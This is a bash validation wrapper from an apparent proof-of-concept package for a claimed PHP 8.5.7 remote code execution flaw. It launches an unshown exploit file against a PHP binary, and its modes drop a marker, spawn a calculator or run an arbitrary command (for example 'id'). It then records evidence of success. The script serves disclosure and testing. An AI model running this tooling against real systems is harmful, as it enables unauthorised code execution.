#!/usr/bin/env bash
# PHP 8.5.7 RCE — Validation wrapper
# Author: sn0x-sharma (Sanket Sharma)
# Usage:
#   ./validate.sh /usr/bin/php8.5
#   ./validate.sh /usr/bin/php8.5 --calc
#   ./validate.sh /usr/bin/php8.5 --cmd "id"
#
# Results written to ./evidence/

set -euo pipefail

PHP_BIN="${1:-}"
MODE="${2:---marker}"
EVIDENCE_DIR="$(dirname "$0")/evidence"
mkdir -p "$EVIDENCE_DIR"

if [[ -z "$PHP_BIN" ]]; then
    echo "Usage: $0 <php-binary> [mode]" >&2
    echo "  modes: --marker (default) | --calc | --cmd <cmd> | --info" >&2
    exit 1
fi

if [[ ! -x "$PHP_BIN" ]]; then
    echo "[!] PHP binary not found or not executable: $PHP_BIN" >&2
    exit 1
fi

PHP_VER=$("$PHP_BIN" -n -r 'echo PHP_VERSION;')
LOG_FILE="$EVIDENCE_DIR/run-${PHP_VER}-$(date +%Y%m%d-%H%M%S).log"

echo "[*] PHP binary : $PHP_BIN"
echo "[*] PHP version: $PHP_VER"
echo "[*] Mode       : $MODE"
echo "[*] Log        : $LOG_FILE"
echo ""

# Run the PoC, capture output
"$PHP_BIN" -n "$(dirname "$0")/sn0xPoc.php" "$MODE" 2>&1 | tee "$LOG_FILE"

echo ""

if [[ "$MODE" == "--marker" ]]; then
    # Extract marker path from log
    MARKER_PATH=$(grep -oP 'marker file: \K\S+' "$LOG_FILE" | head -1)
    if [[ -z "$MARKER_PATH" ]]; then
        # Fallback: reconstruct path
        PID=$(grep -oP 'PID\s+:\s+\K[0-9]+' "$LOG_FILE" | head -1)
        MARKER_PATH="/tmp/php857_rce_${PID}.txt"
    fi

    echo "[*] Checking marker: $MARKER_PATH"

    if [[ -f "$MARKER_PATH" ]]; then
        CONTENT=$(cat "$MARKER_PATH")
        echo "[✓] Marker found: $CONTENT"
        if [[ "$CONTENT" == "PHP857_RCE" ]]; then
            echo "[✓] VALIDATED — RCE confirmed on PHP $PHP_VER"
            cp "$MARKER_PATH" "$EVIDENCE_DIR/marker-${PHP_VER}.txt"
            echo "[*] Evidence saved to $EVIDENCE_DIR/marker-${PHP_VER}.txt"
            exit 0
        else
            echo "[✗] Unexpected content: $CONTENT"
            exit 1
        fi
    else
        echo "[✗] Marker not found at $MARKER_PATH"
        echo "[*] Check log at $LOG_FILE for errors"
        exit 1
    fi
elif [[ "$MODE" == "--calc" ]]; then
    # Just check that the trigger line appeared; calc is visual
    if grep -q 'CALC SPAWNED\|overwrite_returned' "$LOG_FILE"; then
        echo "[✓] Trigger reached — check for calculator window"
        exit 0
    else
        echo "[✗] Trigger line not found in log"
        exit 1
    fi
else
    echo "[*] Log saved. Manual verification needed for mode: $MODE"
    exit 0
fi
